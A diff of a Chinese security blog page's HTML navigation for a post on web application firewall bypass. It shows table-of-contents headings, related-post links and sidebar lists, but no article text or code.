href="#722-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.</span> <span class="toc-text"> 7.2.2 文件上传利用绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%AC%A6%E5%8F%B7%E5%B9%B2%E6%89%B0"><span class="toc-number">2.2.1.</span> <span class="toc-text"> （ 1 ）符号干扰</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#723-xss%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.</span> <span class="toc-text"> 7.2.3 xss 利用绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.1.</span> <span class="toc-text"> 使用方法：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#724-%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text"> 7.2.4 其他绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#73-waf%E6%8B%A6%E6%88%AA%E4%B8%8B%E7%9A%84%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6"><span class="toc-number">3.</span> <span class="toc-text"> 7.3 waf 拦截下的权限控制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#731-php-%E4%BC%A0%E5%8F%82%E5%B8%A6%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text"> 7.3.1 php 传参带入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#732-php-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">3.2.</span> <span class="toc-text"> 7.3.2 php 变量覆盖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#733-php-%E5%8A%A0%E5%AF%86%E5%8F%98%E5%BC%82"><span class="toc-number">3.3.</span> <span class="toc-text"> 7.3.3 php 加密变异</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#734-php-%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97"><span class="toc-number">3.4.</span> <span class="toc-text"> 7.3.4 php 异或运算</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#74-%E5%86%B0%E8%9D%8E%E5%93%A5%E6%96%AF%E6%8B%89%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text"> 7.4 冰蝎哥斯拉流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#741-waf%E7%BB%95%E8%BF%87%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">4.1.</span> <span class="toc-text"> 7.4.1 waf 绕过的思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#742-%E5%86%B0%E8%9F%B9%E5%8E%9F%E7%90%86"><span class="toc-number">4.2.</span> <span class="toc-text"> 7.4.2 冰蟹原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85%E8%A7%A3%E5%AF%86%E5%90%8E%E5%B9%B6%E5%9C%A8%E5%B7%A5%E5%85%B7%E4%B8%8A%E5%81%9A%E5%B1%95%E7%A4%BA"><span class="toc-number">4.2.1.</span> <span class="toc-text"> 的数据包解密后并在工具上做展示。</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#743-%E5%86%B0%E8%9F%B9%E6%95%B0%E6%8D%AE%E5%8C%85%E7%89%B9%E5%BE%81"><span class="toc-number">4.3.</span> <span class="toc-text"> 7.4.3 冰蟹数据包特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#744-%E5%93%A5%E6%96%AF%E6%8B%89%E7%89%B9%E5%BE%81"><span class="toc-number">4.4.</span> <span class="toc-text"> 7.4.4 哥斯拉特征</span></a></li></ol></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89waf%E6%97%B6%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text"> 有 waf 时的信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8B%A6%E6%88%AA%E5%AF%B9%E6%8A%97"><span class="toc-number">1.1.</span> <span class="toc-text"> 信息收集拦截对抗</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%84%9A%E6%9C%AC"><span class="toc-number">1.2.</span> <span class="toc-text"> 信息收集脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8B%A6%E6%88%AA%E5%AF%B9%E6%8A%97"><span class="toc-number">2.</span> <span class="toc-text"> 漏洞利用拦截对抗</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text"> sql 注入利用绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.</span> <span class="toc-text"> 文件上传拦截绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xss%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.</span> <span class="toc-text"> xss 拦截绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text"> 其他绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E5%AF%B9%E6%8A%97"><span class="toc-number">3.</span> <span class="toc-text"> 权限控制对抗</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php-%E4%BC%A0%E5%8F%82%E5%B8%A6%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text"> php 传参带入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">3.2.</span> <span class="toc-text"> php 变量覆盖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-%E5%8A%A0%E5%AF%86%E5%8F%98%E5%BC%82"><span class="toc-number">3.3.</span> <span class="toc-text"> php 加密变异</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97"><span class="toc-number">3.4.</span> <span class="toc-text"> php 异或运算</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E%E5%93%A5%E6%96%AF%E6%8B%89%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text"> 冰蝎哥斯拉流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#waf%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="toc-number">4.1.</span> <span class="toc-text"> waf 绕过思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%B0%E8%9F%B9%E5%8E%9F%E7%90%86"><span class="toc-number">4.2.</span> <span class="toc-text"> 冰蟹原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%B0%E8%9F%B9%E6%95%B0%E6%8D%AE%E5%8C%85%E7%89%B9%E5%BE%81"><span class="toc-number">4.3.</span> <span class="toc-text"> 冰蟹数据包特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89%E6%95%B0%E6%8D%AE%E5%8C%85%E7%89%B9%E5%BE%81"><span class="toc-number">4.4.</span> <span class="toc-text"> 哥斯拉数据包特征</span></a></li></ol></li></ol>
       </div>
       <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2023/03/18/SAFE/Trojan/" rel="bookmark" title="Trojan 生成">Trojan 生成</a></li><li><a href="/2023/05/19/SAFE/Linux/" rel="bookmark" title="Linux 命令">Linux 命令</a></li><li><a href="/2023/07/02/SAFE/Security%20URL/" rel="bookmark" title="信息安全 网址">信息安全 网址</a></li><li><a href="/2023/07/04/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="bookmark" title="XD22 1 Web 基础知识">XD22 1 Web 基础知识</a></li><li><a href="/2023/07/04/SAFE/14%20%E6%89%93%E7%A0%B4%E5%B8%B8%E8%A7%84/" rel="bookmark" title="XD22 14 打破常规">XD22 14 打破常规</a></li><li><a href="/2023/07/04/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="bookmark" title="XD22 11 内网安全">XD22 11 内网安全</a></li><li><a href="/2023/07/04/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="bookmark" title="XD22 12 权限维持">XD22 12 权限维持</a></li><li><a href="/2023/07/04/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" rel="bookmark" title="XD22 10 免杀对抗">XD22 10 免杀对抗</a></li><li><a href="/2023/07/04/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/" rel="bookmark" title="XD22 13 补充知识">XD22 13 补充知识</a></li><li><a href="/2023/07/04/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="XD22 2 Web 通用漏洞">XD22 2 Web 通用漏洞</a></li><li><a href="/2023/07/04/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 3 服务攻防">XD22 3 服务攻防</a></li><li><a href="/2023/07/04/SAFE/5%20APP%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 5 APP 攻防">XD22 5 APP 攻防</a></li><li><a href="/2023/07/04/SAFE/4%20API%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 4 API 攻防">XD22 4 API 攻防</a></li><li><a href="/2023/07/04/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/" rel="bookmark" title="XD22 6 漏洞发现及利用">XD22 6 漏洞发现及利用</a></li><li class="active"><a href="/2023/07/04/SAFE/7%20waf%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 7 Waf 攻防">XD22 7 Waf 攻防</a></li><li><a href="/2023/07/04/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="bookmark" title="XD22 8 代码审计">XD22 8 代码审计</a></li><li><a href="/2023/07/04/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="bookmark" title="XD22 9 权限提升">XD22 9 权限提升</a></li>
+        </ul>
       </div>
       <div class="overview panel" data-title="站点概览">
         <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -624,7 +406,7 @@ en;q=0.2<br>
 <nav class="state">
     <div class="item posts">
       <a href="/archives/">
-        <span class="count">166</span>
+        <span class="count">167</span>
         <span class="name">文章</span>
       </a>
     </div>
@@ -636,7 +418,7 @@ en;q=0.2<br>
     </div>
     <div class="item tags">
       <a href="/tags/">
-        <span class="count">40</span>
+        <span class="count">39</span>
         <span class="name">标签</span>
       </a>
     </div>
@@ -719,12 +501,12 @@ en;q=0.2<br>
 
   <ul id="quick">
     <li class="prev pjax">
-        <a href="/2023/07/04/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+        <a href="/2023/07/04/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
-        <a href="/2023/07/04/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+        <a href="/2023/07/04/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
@@ -746,40 +528,10 @@ en;q=0.2<br>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
-</div>
-
-    <span><a href="/2023/06/30/BOOK/13%E3%80%8A%E4%BA%BA%E8%A6%81%E6%9C%89%E7%82%B9%E4%BF%A1%E4%BB%B0%E3%80%8B%E6%9D%8E%E5%A4%A7%E4%BC%9F/" title="《人要有点信仰》李大伟">《人要有点信仰》李大伟</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
-</div>
-
-    <span><a href="/2023/06/30/BOOK/36%E3%80%8A%E4%B8%80%E7%99%BE%E4%B8%AA%E4%BA%BA%E7%9A%84%E5%8D%81%E5%B9%B4%E3%80%8B%E5%86%AF%E9%AA%A5%E6%89%8D/" title="《一百个人的十年》冯骥才">《一百个人的十年》冯骥才</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
-</div>
-
-    <span><a href="/2023/06/30/BOOK/20%E3%80%8A%E5%B0%91%E5%B9%B4%E7%BB%B4%E7%89%B9%E4%B9%8B%E7%83%A6%E6%81%BC%E3%80%8B%E7%BA%A6%E7%BF%B0%C2%B7%E6%B2%83%E5%B0%94%E5%A4%AB%E5%86%88%C2%B7%E6%AD%8C%E5%BE%B7/" title="《少年维特之烦恼》约翰·沃尔夫冈·歌德">《少年维特之烦恼》约翰·沃尔夫冈·歌德</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
 <a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
 </div>
 
-    <span><a href="/2023/06/30/BOOK/45%E3%80%8A%E5%B7%B4%E9%BB%8E%E5%9C%A3%E6%AF%8D%E9%99%A2%E3%80%8B%E9%9B%A8%E6%9E%9C/" title="《巴黎圣母院》雨果">《巴黎圣母院》雨果</a></span>
+    <span><a href="/2023/06/30/BOOK/34%E3%80%8A%E6%9C%88%E4%BA%AE%E5%92%8C%E5%85%AD%E4%BE%BF%E5%A3%AB%E3%80%8B%E6%AF%9B%E5%A7%86/" title="《月亮和六便士》毛姆">《月亮和六便士》毛姆</a></span>
   </li>
 
       
@@ -789,7 +541,27 @@ en;q=0.2<br>
 <a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
 </div>
 
-    <span><a href="/2023/07/01/VULNHUB/108%20MATRIX/" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></span>
+    <span><a href="/2023/07/01/VULNHUB/105%20EARTH/" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
+</div>
+
+    <span><a href="/2023/06/30/BOOK/33%E3%80%8A%E9%9B%BE%E9%83%BD%E5%AD%A4%E5%84%BF%E3%80%8B%E7%8B%84%E6%9B%B4%E6%96%AF/" title="《雾都孤儿》狄更斯">《雾都孤儿》狄更斯</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/02/VULNHUB/114%20ICA/" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></span>
   </li>
 
       
@@ -806,30 +578,10 @@ en;q=0.2<br>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
 </div>
 
-    <span><a href="/2023/07/01/VULNHUB/137%20VENUS/" title="VULNHUB VENUS">VULNHUB VENUS</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
-</div>
-
-    <span><a href="/2023/04/01/MBTI/ENFP%E8%A7%A3%E8%AF%BB/" title="ENFP解读">ENFP解读</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
-</div>
-
-    <span><a href="/2023/07/01/VULNHUB/124%20HACKABLELL/" title="VULNHUB HACKABLELL">VULNHUB HACKABLELL</a></span>
+    <span><a href="/2023/07/04/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="XD22 1 Web 基础知识">XD22 1 Web 基础知识</a></span>
   </li>
 
       
@@ -839,7 +591,37 @@ en;q=0.2<br>
 <a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
 </div>
 
-    <span><a href="/2023/06/30/BOOK/22%E3%80%8A%E4%BA%BA%E6%80%A7%E7%9A%84%E5%BC%B1%E7%82%B9%E3%80%8B%E6%88%B4%E5%B0%94%C2%B7%E5%8D%A1%E8%80%90%E5%9F%BA/" title="《人性的弱点》戴尔·卡耐基">《人性的弱点》戴尔·卡耐基</a></span>
+    <span><a href="/2023/06/30/BOOK/4%E3%80%8A%E4%BA%BA%E9%97%B4%E5%A4%B1%E6%A0%BC%E3%80%8B%E5%A4%AA%E5%AE%B0%E6%B2%BB/" title="《人间失格》太宰治">《人间失格》太宰治</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/02/VULNHUB/112%20THOTH/" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/06/30/BOOK/50%E3%80%8A%E5%90%91%E6%AD%BB%E8%80%8C%E7%94%9F%E3%80%8B%E5%8C%97%E9%87%8E%E6%AD%A6/" title="《向死而生》北野武">《向死而生》北野武</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/ISFP%E8%A7%A3%E8%AF%BB/" title="ISFP解读">ISFP解读</a></span>
   </li>
 
   </ul>
